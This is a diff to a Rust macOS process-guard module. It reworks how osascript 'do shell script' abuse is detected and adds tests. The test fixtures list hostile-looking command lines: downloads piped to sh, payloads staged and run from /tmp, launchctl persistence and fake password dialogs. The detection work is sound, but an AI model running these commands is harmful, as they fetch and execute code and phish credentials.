@@ -89,17 +89,23 @@ pub const CURL_PIPE_SHELL: &str = "curl | sh";
 pub const OSASCRIPT_PASSWORD_PROMPT: &str = "osascript hidden-answer prompt";
 /// AppleScript used to fetch or stage something through the shell.
 pub const OSASCRIPT_SHELL_FETCH: &str = "osascript do shell script fetch";
-/// A shell call that only mentions /tmp/: many installers do that, so it is reported, never stopped.
-pub const OSASCRIPT_TMP_PATH: &str = "osascript do shell script with /tmp path";
+/// A shell or python whose own command line merely mentions osascript's shell call: a script
+/// that searches for the words, or a wrapper that runs one. Reported, never stopped.
+pub const OSASCRIPT_SHELL_MENTION: &str = "shell command line mentioning osascript do shell script";
 
 /// Patterns that raise an alert but never terminate the process.
 pub fn is_alert_only(pattern: &str) -> bool {
-    pattern == OSASCRIPT_TMP_PATH
+    pattern == OSASCRIPT_SHELL_MENTION
 }
 
 /// What malware does with inline AppleScript. A bare `osascript -e` is not a signal: launchers,
 /// installers and automation tools run one constantly, and flagging them all hid the real ones.
-fn osascript_abuse(normalized: &str) -> Option<&'static str> {
+/// The rule depends on the process. `osascript` itself shows its whole program in its own
+/// command line, so there the shell call with a fetch word is a stop. A shell or python that
+/// only mentions it (`git log -S"do shell script"`, a wrapper that redirects `pwd -P >| /tmp/x`)
+/// is an alert, unless the line feeds text to osascript (`| osascript`, `osascript <<`): the
+/// child's own command line would not show that text.
+fn osascript_abuse(process: &str, normalized: &str) -> Option<&'static str> {
     if !normalized.contains("osascript") {
         return None;
     }
@@ -108,48 +114,16 @@ fn osascript_abuse(normalized: &str) -> Option<&'static str> {
     }
     let has = |needles: &[&str]| needles.iter().any(|needle| normalized.contains(needle));
     // "doshellscript" is the same call from JavaScript for Automation (osascript -l JavaScript).
-    if !has(&["do shell script", "doshellscript"]) {
+    let runs_shell = has(&["do shell script", "doshellscript"]);
+    let fetches = has(&["curl ", "wget ", "base64", "/tmp/", "chmod +x"]);
+    if !(runs_shell && fetches) {
         return None;
     }
-    if has(&["curl ", "wget ", "base64", "chmod +x"]) {
-        return Some(OSASCRIPT_SHELL_FETCH);
-    }
-    if !has(&["/tmp/"]) {
-        return None;
-    }
-    // A /tmp/ path is only alert-only on its own (installers do that, and so does a shell
-    // wrapper that redirects `pwd -P >| /tmp/x`). It is a stop with any of these next to it;
-    // `with administrator privileges` counts only when something is also run from /tmp (the
-    // wrapper may carry our own installer's prompt), so a bare `do shell script "/tmp/x"` or
-    // the wrapper stays alert-only. shortcut: matched as plain words, so a harmless line that
-    // mentions curl/wget/chmod/xattr - next to a /tmp/ path is stopped, and a command run from
-    // /tmp/ only through `(`-glued JavaScript syntax is not seen as "run".
-    let (interpreter, direct) = runs_from_tmp(normalized);
-    let stronger = has(&["chmod", "curl", "wget", "xattr -", "openssl enc"]) || interpreter;
-    let admin = has(&["with administrator privileges"]) && (interpreter || direct);
-    if stronger || admin {
+    if process == "osascript" || has(&["| osascript", "osascript <<"]) {
         Some(OSASCRIPT_SHELL_FETCH)
     } else {
-        Some(OSASCRIPT_TMP_PATH)
+        Some(OSASCRIPT_SHELL_MENTION)
     }
-}
-
-/// (an interpreter such as `sh`/`python3` given a /tmp/ file, a /tmp/ file run directly)
-fn runs_from_tmp(normalized: &str) -> (bool, bool) {
-    let tokens: Vec<&str> = normalized.split(' ').collect();
-    let (mut interpreter, mut direct) = (false, false);
-    for pair in tokens.windows(2) {
-        if !(pair[1].starts_with("/tmp/") || pair[1].starts_with("/private/tmp/")) {
-            continue;
-        }
-        let before = pair[0].rsplit('/').next().unwrap_or(pair[0]);
-        if matches!(before, "sh" | "bash" | "zsh" | "dash") || before.starts_with("python") {
-            interpreter = true;
-        } else if matches!(before, "script" | "&&" | "||") || before.ends_with(';') {
-            direct = true;
-        }
-    }
-    (interpreter, direct)
 }
 
 /// `curl ... | [sudo] sh|bash|zsh` within one command line (download-and-execute).
@@ -198,7 +172,7 @@ pub fn match_lotl_macos(process_name: &str, cmdline: &str) -> Option<&'static st
         return Some(CURL_PIPE_SHELL);
     }
     // The alert-only result is the weakest: it is returned only when no other rule matched.
-    let abuse = osascript_abuse(&normalized);
+    let abuse = osascript_abuse(&name, &normalized);
     if abuse.is_some_and(|a| !is_alert_only(a)) {
         return abuse;
     }
@@ -843,72 +817,219 @@ mod tests {
         );
     }
 
-    #[test]
-    fn a_tmp_path_alone_is_alert_only_but_fetch_combinations_still_stop() {
-        let tmp = "osascript -e 'do shell script \"/tmp/helper --setup\"'";
-        assert_eq!(match_lotl_macos("osascript", tmp), Some(OSASCRIPT_TMP_PATH));
-        assert!(is_alert_only(OSASCRIPT_TMP_PATH));
-        for stopped in [
-            "osascript -e 'do shell script \"curl -s http://x -o /tmp/p\"'",
-            "osascript -e 'do shell script \"wget http://x -O /tmp/p\"'",
-            "osascript -e 'do shell script \"echo aQ== | base64 -D > /tmp/p\"'",
-            "osascript -e 'do shell script \"chmod +x /tmp/p\"'",
-        ] {
-            let found = match_lotl_macos("osascript", stopped);
-            assert_eq!(found, Some(OSASCRIPT_SHELL_FETCH), "{stopped}");
-            assert!(!is_alert_only(found.unwrap()));
+    /// `osascript_abuse` and `match_lotl_macos` exactly as released in 85e35b4 (the others they
+    /// call, `curl_piped_to_shell` and the pattern list, have not changed since).
+    fn reference_match_85e35b4(process_name: &str, cmdline: &str) -> Option<&'static str> {
+        fn old_osascript_abuse(normalized: &str) -> Option<&'static str> {
+            if !normalized.contains("osascript") {
+                return None;
+            }
+            if normalized.contains("hidden answer") {
+                return Some(OSASCRIPT_PASSWORD_PROMPT);
+            }
+            let fetches = ["curl ", "wget ", "base64", "/tmp/", "chmod +x"]
+                .iter()
+                .any(|needle| normalized.contains(needle));
+            let runs_shell =
+                normalized.contains("do shell script") || normalized.contains("doshellscript");
+            (runs_shell && fetches).then_some(OSASCRIPT_SHELL_FETCH)
         }
-        let hidden = "osascript -e 'do shell script \"/tmp/x\"' -e 'with hidden answer'";
-        let found = match_lotl_macos("osascript", hidden);
-        assert_eq!(found, Some(OSASCRIPT_PASSWORD_PROMPT));
-        assert!(!is_alert_only(found.unwrap()));
-        // /tmp/ without a shell call is still nothing.
-        assert_eq!(match_lotl_macos("osascript", "osascript /tmp/a.scpt"), None);
+        let name = process_name.to_lowercase();
+        let is_python = name == "python" || name.starts_with("python3");
+        if !is_python && !MACOS_LOTL_PROCESSES.contains(&name.as_str()) {
+            return None;
+        }
+        let unquoted: String = cmdline
+            .chars()
+            .filter(|c| *c != '"' && *c != '\'')
+            .collect::<String>()
+            .replace('|', " | ");
+        let normalized = unquoted
+            .split_whitespace()
+            .collect::<Vec<_>>()
+            .join(" ")
+            .to_lowercase();
+        if curl_piped_to_shell(&normalized) {
+            return Some(CURL_PIPE_SHELL);
+        }
+        if let Some(abuse) = old_osascript_abuse(&normalized) {
+            return Some(abuse);
+        }
+        MACOS_LOTL_PATTERNS
+            .iter()
+            .copied()
+            .find(|pattern| normalized.contains(pattern))
+    }
+
+    #[derive(Debug, PartialEq, Clone, Copy)]
+    enum Outcome {
+        Terminate,
+        Alert,
+        None,
+    }
+
+    fn outcome(name: &str, line: &str) -> Outcome {
+        let found = match_lotl_macos(name, line);
+        assert_eq!(found, check_lotl_command(name, line), "{name}: {line}");
+        match found {
+            None => Outcome::None,
+            Some(pattern) if is_alert_only(pattern) => Outcome::Alert,
+            Some(_) => Outcome::Terminate,
+        }
+    }
+
+    /// (the process the line runs under, its command line)
+    const MALICIOUS: &[(&str, &str)] = &[
+        ("osascript", "osascript -e 'do shell script \"nohup /tmp/.h &\"'"),
+        ("osascript", "osascript -e 'do shell script \"curl -s http://x/p -o /tmp/p\"'"),
+        ("osascript", "osascript -e 'do shell script \"wget http://x -O /tmp/p\"'"),
+        ("osascript", "osascript -e 'do shell script \"echo aQ== | base64 -D > /tmp/p\"'"),
+        ("osascript", "osascript -e 'do shell script \"chmod +x /tmp/p\"'"),
+        ("osascript", "osascript -e 'do shell script \"/tmp/p\" with administrator privileges'"),
+        ("osascript", "osascript -e 'do shell script \"launchctl load /tmp/x.plist\"'"),
+        ("osascript", "osascript -l JavaScript -e 'app.doShellScript(\"curl http://x | sh\")'"),
+        ("osascript", "osascript -l JavaScript -e 'app.doShellScript(\"/tmp/x\")'"),
+        ("osascript", "osascript -e 'display dialog \"Password\" default answer \"\" with hidden answer'"),
+        ("sh", "sh -c 'echo \"do shell script \\\"curl http://x -o /tmp/p\\\"\" | osascript'"),
+        ("bash", "bash -c \"osascript <<< 'do shell script \\\"/tmp/x\\\"'\""),
+        ("python3", "python3 -c \"import os; os.system('echo do shell script curl x | osascript')\""),
+        ("sh", "sh -c 'curl http://x | sh # osascript do shell script /tmp/'"),
+        ("sh", "sh -c 'launchctl load x.plist # osascript do shell script /tmp/'"),
+        ("zsh", "zsh -c 'osascript -e \"display dialog \\\"Password\\\" default answer \\\"\\\" with hidden answer\"'"),
+        ("bash", "bash -c 'chmod +x /tmp/payload && /tmp/payload'"),
+    ];
+
+    const BENIGN: &[(&str, &str, Outcome)] = &[
+        (
+            "zsh",
+            "zsh -c source /x/snapshot.sh && eval 'chmod 644 notes.txt; osascript -e \"do shell script \\\"id\\\"\"' && pwd -P >| /tmp/claude-1-cwd",
+            Outcome::Alert,
+        ),
+        ("zsh", "zsh -c 'osascript -e \"do shell script \\\"id\\\" with administrator privileges\"' && pwd -P >| /tmp/claude-1-cwd", Outcome::Alert),
+        ("bash", "bash -c 'osascript -e \"do shell script \\\"id\\\"\" && cat /tmp/x'", Outcome::Alert),
+        ("zsh", "zsh -c 'grep -r doShellScript ~/scripts | grep /tmp/ ; echo osascript'", Outcome::Alert),
+        ("bash", "bash -c 'echo see osascript do shell script docs, notes in /tmp/notes'", Outcome::Alert),
+        ("python3", "python3 -c \"print('osascript do shell script curl x')\"", Outcome::Alert),
+        ("zsh", "zsh -c 'git log -S\"do shell script\" && xattr -l x'", Outcome::None),
+        ("bash", "bash /tmp/build.sh && osascript -e 'display notification \"done\"'", Outcome::None),
+        ("zsh", "zsh -c 'rg \"do shell script\" | grep curl'", Outcome::None),
+        ("zsh", "zsh -c git commit -m 'document osascript do shell script'", Outcome::None),
+        ("zsh", "zsh -c 'osascript -e \"tell application \\\"Finder\\\" to quit\"'", Outcome::None),
+        ("python3", "python3 build.py --notify osascript", Outcome::None),
+        ("zsh", "zsh -c cargo build", Outcome::None),
+        ("sh", "sh -c 'curl -s https://x/sums.txt | shasum -a 256 -c'", Outcome::None),
+        ("curl", "curl -fsSL -o setup.pkg https://example.com/setup.pkg", Outcome::None),
+        ("osascript", "osascript -e 'do shell script \"id\"'", Outcome::None),
+        ("osascript", "osascript -e 'tell application \"System Events\" to get name of every process'", Outcome::None),
+        ("osascript", "osascript -e 'display dialog \"Done\"'", Outcome::None),
+        ("osascript", "osascript /tmp/a.scpt", Outcome::None),
+        ("osascript", "osascript - The Nex: ZIP_BOMB (HIGH) /tmp/a.zip", Outcome::None),
+    ];
+
+    #[test]
+    fn the_do_shell_script_rule_depends_on_the_process_that_runs_the_line() {
+        assert!(MALICIOUS.len() >= 12 && BENIGN.len() >= 12);
+        for (name, line) in MALICIOUS {
+            assert_eq!(outcome(name, line), Outcome::Terminate, "{name}: {line}");
+        }
+        for (name, line, expected) in BENIGN {
+            assert_eq!(outcome(name, line), *expected, "{name}: {line}");
+        }
+        // Alert-only is the weakest result: a stronger pattern in the same line still stops it,
+        // and the name of a pattern that only alerts is never returned for a stop.
+        assert!(is_alert_only(OSASCRIPT_SHELL_MENTION));
+        assert!(!is_alert_only(OSASCRIPT_SHELL_FETCH));
+        assert_eq!(
+            match_lotl_macos(
+                "sh",
+                "sh -c 'launchctl load x.plist # osascript do shell script /tmp/'"
+            ),
+            Some("launchctl load")
+        );
+        // Words that change nothing for osascript itself (the old rule had none of them).
+        for line in [
+            "osascript -e 'do shell script \"xattr -c /tmp/p\"'",
+            "osascript -e 'do shell script \"ch''mod u+x /tmp/p\"'",
+            "osascript -e 'do shell script \"sh /tmp/p\" with administrator privileges'",
+        ] {
+            assert_eq!(outcome("osascript", line), Outcome::Terminate, "{line}");
+        }
     }
 
     #[test]
-    fn a_stronger_rule_wins_over_the_tmp_alert_and_old_kills_stay_kills() {
-        let kill = |name: &str, line: &str| {
-            let found = match_lotl_macos(name, line);
-            assert!(
-                found.is_some_and(|f| !is_alert_only(f)),
-                "{line}: {found:?}"
-            );
-        };
-        kill(
-            "osascript",
-            "osascript -e 'do shell script \"launchctl load /tmp/x.plist\"'",
-        );
-        kill(
-            "sh",
-            "sh -c 'launchctl load x.plist # osascript do shell script /tmp/'",
-        );
-        kill(
-            "sh",
-            "sh -c 'curl http://x | sh # osascript do shell script /tmp/'",
-        );
-        for line in [
-            "do shell script \"chmod 755 /tmp/p\"",
-            "do shell script \"ch''mod u+x /tmp/p\"",
-            "do shell script \"curl${IFS}http://x -o /tmp/p\"",
-            "do shell script \"wget${IFS}http://x -O /tmp/p\"",
-            "do shell script \"xattr -c /tmp/p\"",
-            "do shell script \"openssl enc -d -in /tmp/p\"",
-            "do shell script \"python3 /tmp/p.py\"",
-            "do shell script \"/bin/bash /tmp/p.sh\"",
-            "do shell script \"zsh /tmp/p\"",
-            "do shell script \"/tmp/p\" with administrator privileges",
-            "do shell script \"sh /tmp/p\" with administrator privileges",
+    fn for_a_process_named_osascript_exactly_the_lines_85e35b4_stopped_are_stopped() {
+        let mut lines: Vec<String> = MALICIOUS
+            .iter()
+            .map(|(_, l)| l.to_string())
+            .chain(BENIGN.iter().map(|(_, l, _)| l.to_string()))
+            .collect();
+        let calls = [
+            "do shell script \"X\"",
+            "app.doShellScript(\"X\")",
+            "do shell script \"id\" & \"X\" with administrator privileges",
+            "display dialog \"X\"",
+        ];
+        let words = [
+            "id",
+            "curl http://x -o p",
+            "wget http://x",
+            "echo aQ== | base64 -D",
+            "base64",
+            "chmod +x p",
+            "chmod 755 /tmp/p",
+            "/tmp/p",
+            "/private/tmp/p",
+            "sh /tmp/p",
+            "python3 /tmp/p.py",
+            "xattr -c p",
+            "openssl enc -d -in p",
+            "launchctl load /tmp/x.plist",
+            "launchctl load x",
+            "curl http://x | sh",
+            "with hidden answer",
+            "b64decode(x)",
+            "curl$IFS http://x",
+        ];
+        for prefix in [
+            "osascript -e '",
+            "osascript -l JavaScript -e '",
+            "osascript - '",
         ] {
-            kill("osascript", &format!("osascript -e '{line}'"));
+            for call in calls {
+                for word in words {
+                    lines.push(format!("{prefix}{}'", call.replace('X', word)));
+                    lines.push(format!("{prefix}{}' -e '{word}'", call.replace('X', "id")));
+                }
+            }
         }
-        // Only a bare mention, or the benign shell wrapper, is reported but not stopped.
-        for line in [
-            "osascript -e 'do shell script \"/tmp/helper --setup\"'",
-            "zsh -c eval 'osascript -e do shell script id' < /dev/null && pwd -P >| /tmp/claude-1-cwd",
-            "zsh -c osascript -e 'do shell script \"id\" with administrator privileges' && pwd -P >| /tmp/claude-1-cwd",
-        ] {
-            assert_eq!(match_lotl_macos("zsh", line), Some(OSASCRIPT_TMP_PATH), "{line}");
+        let mut stopped = 0;
+        for line in &lines {
+            let old = reference_match_85e35b4("osascript", line);
+            assert_eq!(match_lotl_macos("osascript", line), old, "{line}");
+            assert_eq!(match_lotl_macos("OsaScript", line), old, "{line}");
+            stopped += usize::from(old.is_some());
+        }
+        assert!(
+            stopped > 50 && stopped < lines.len(),
+            "{stopped} of {}",
+            lines.len()
+        );
+        // Every other process behaves as before except for the one case this rule changes:
+        // the shell call with a fetch word is an alert unless the line feeds osascript.
+        for line in &lines {
+            for name in ["zsh", "bash", "sh", "python3", "curl"] {
+                let (old, new) = (
+                    reference_match_85e35b4(name, line),
+                    match_lotl_macos(name, line),
+                );
+                if old != new && !new.is_some_and(|n| !is_alert_only(n)) {
+                    // Not stopped any more: only the case this rule changes, and only when no
+                    // other pattern in the line stops it.
+                    assert_eq!(old, Some(OSASCRIPT_SHELL_FETCH), "{name}: {line}");
+                    assert_eq!(new, Some(OSASCRIPT_SHELL_MENTION), "{name}: {line}");
+                    assert!(!line.contains("| osascript") && !line.contains("osascript <<"));
+                }
+            }
         }
     }
 
@@ -919,7 +1040,8 @@ mod tests {
         let _ = fs::remove_dir_all(&dir);
         fs::create_dir_all(&dir).unwrap();
         let dir = fs::canonicalize(&dir).unwrap();
-        let exe = dir.join("osascript");
+        // Runs as a shell that only mentions osascript's shell call: alert-only.
+        let exe = dir.join("zsh");
         fs::copy(std::env::current_exe().unwrap(), &exe).unwrap();
         let mut cfg = AppConfig::for_base_dir(&dir.join("base"));
         cfg.ensure_dirs().unwrap();
@@ -937,7 +1059,7 @@ mod tests {
         // The copy only runs `napper` (extra words are just more test-name filters).
         let mut child = std::process::Command::new(&exe)
             .args(["--ignored", "--exact", "process_guard::tests::napper"])
-            .args(["do", "shell", "script", "/tmp/helper"])
+            .args(["osascript", "do", "shell", "script", "/tmp/helper"])
             .env("THENEX_TEST_NAP", "1")
             .stdout(std::process::Stdio::null())
             .stderr(std::process::Stdio::null())
@@ -995,7 +1117,7 @@ mod tests {
                 .map(|e| e.action_taken)
                 .collect()
         };
-        g.respond_lotl(pid, "osascript", "osascript -e x", OSASCRIPT_TMP_PATH);
+        g.respond_lotl(pid, "zsh", "zsh -c x", OSASCRIPT_SHELL_MENTION);
         let seen = actions(&g);
         assert!(seen[0].starts_with("ALERT_ONLY: "), "{seen:?}");
         assert!(
@@ -1081,6 +1203,36 @@ mod tests {
         }
     }
 
+    /// A copy of this test program that only runs `napper` (no platform program is copied: a
+    /// copied /bin/sleep is sometimes refused or not yet visible when the test looks for it).
+    #[cfg(unix)]
+    fn spawn_napper(exe: &Path) -> std::process::Child {
+        std::process::Command::new(exe)
+            .args(["--ignored", "--exact", "process_guard::tests::napper"])
+            .env("THENEX_TEST_NAP", "1")
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .spawn()
+            .unwrap()
+    }
+
+    /// Refreshes until each pid shows its image path: a process just started may not yet.
+    #[cfg(unix)]
+    fn refresh_until_seen(g: &mut ProcessGuard, pids: &[Pid]) {
+        for _ in 0..200 {
+            g.sys
+                .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
+            if pids
+                .iter()
+                .all(|pid| g.sys.process(*pid).is_some_and(|p| p.exe().is_some()))
+            {
+                return;
+            }
+            thread::sleep(Duration::from_millis(50));
+        }
+        panic!("started processes never showed their image path");
+    }
+
     #[cfg(target_os = "macos")]
     #[test]
     fn a_listed_program_is_stopped_unless_already_running_or_signed_by_apple() {
@@ -1089,25 +1241,21 @@ mod tests {
         let _ = fs::remove_dir_all(&dir);
         fs::create_dir_all(&dir).unwrap();
         let dir = fs::canonicalize(&dir).unwrap();
-        // A copy of this test program (not signed by Apple) and one of /bin/sleep (signed by
-        // Apple); both go on the list.
-        let (exe, apple) = (dir.join("napper"), dir.join("apple-napper"));
+        // A copy of this test program (not signed by Apple) and the real /bin/sleep (signed by
+        // Apple, and left where it is: the guard must not touch it); both go on the list.
+        let (exe, apple) = (dir.join("napper"), PathBuf::from("/bin/sleep"));
         fs::copy(std::env::current_exe().unwrap(), &exe).unwrap();
-        fs::copy("/bin/sleep", &apple).unwrap();
         let nap = |program: &Path| -> Child {
-            // The copy of this test program runs only `napper`; sleep takes the seconds.
-            let args: &[&str] = if program == apple {
-                &["60"]
+            if program == apple {
+                Command::new(program)
+                    .arg("60")
+                    .stdout(Stdio::null())
+                    .stderr(Stdio::null())
+                    .spawn()
+                    .unwrap()
             } else {
-                &["--ignored", "--exact", "process_guard::tests::napper"]
-            };
-            Command::new(program)
-                .args(args)
-                .env("THENEX_TEST_NAP", "1")
-                .stdout(Stdio::null())
-                .stderr(Stdio::null())
-                .spawn()
-                .unwrap()
+                spawn_napper(program)
+            }
         };
 
         let mut cfg = AppConfig::for_base_dir(&dir.join("base"));
@@ -1141,12 +1289,8 @@ mod tests {
             Arc::new(BinaryAiScanner::heuristic_only()),
             Arc::new(Telemetry::default()),
         );
-        let refresh = |g: &mut ProcessGuard| {
-            g.sys
-                .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind())
-        };
-        refresh(&mut g);
         let old_pid = Pid::from_u32(old.id());
+        refresh_until_seen(&mut g, &[old_pid]);
         g.baseline
             .insert((old_pid, g.sys.process(old_pid).unwrap().start_time()));
 
@@ -1164,7 +1308,7 @@ mod tests {
         // A new copy of it: dry run only reports...
         let mut new = nap(&exe);
         let new_pid = Pid::from_u32(new.id());
-        refresh(&mut g);
+        refresh_until_seen(&mut g, &[new_pid]);
         set_dry_run(&cfg, true);
         g.inspect_binary(new_pid, false);
         assert_eq!(
@@ -1187,7 +1331,7 @@ mod tests {
         // Signed by Apple: a wrong list entry must not take a system program away.
         let mut signed = nap(&apple);
         let signed_pid = Pid::from_u32(signed.id());
-        refresh(&mut g);
+        refresh_until_seen(&mut g, &[signed_pid]);
         g.inspect_binary(signed_pid, false);
         assert_eq!(
             events(&cfg)[3].action_taken,
@@ -1261,23 +1405,21 @@ mod tests {
     #[cfg(unix)]
     #[test]
     fn kill_all_with_exe_spares_preexisting_instances() {
-        use std::process::Command;
         let dir = std::env::temp_dir().join(format!("thenex-pg-{}", std::process::id()));
         let _ = fs::remove_dir_all(&dir);
         fs::create_dir_all(&dir).unwrap();
         let exe = dir.join("napper");
-        fs::copy("/bin/sleep", &exe).unwrap();
-        let mut old = Command::new(&exe).arg("30").spawn().unwrap();
-        let mut new = Command::new(&exe).arg("30").spawn().unwrap();
+        fs::copy(std::env::current_exe().unwrap(), &exe).unwrap();
+        let mut old = spawn_napper(&exe);
+        let mut new = spawn_napper(&exe);
         let cfg = Arc::new(AppConfig::for_base_dir(&dir.join("base")));
         let mut g = ProcessGuard::new(
             cfg,
             Arc::new(BinaryAiScanner::heuristic_only()),
             Arc::new(Telemetry::default()),
         );
-        g.sys
-            .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
         let old_pid = Pid::from_u32(old.id());
+        refresh_until_seen(&mut g, &[old_pid, Pid::from_u32(new.id())]);
         let started = g.sys.process(old_pid).unwrap().start_time();
         g.baseline.insert((old_pid, started));
         let canon = fs::canonicalize(&exe).unwrap();
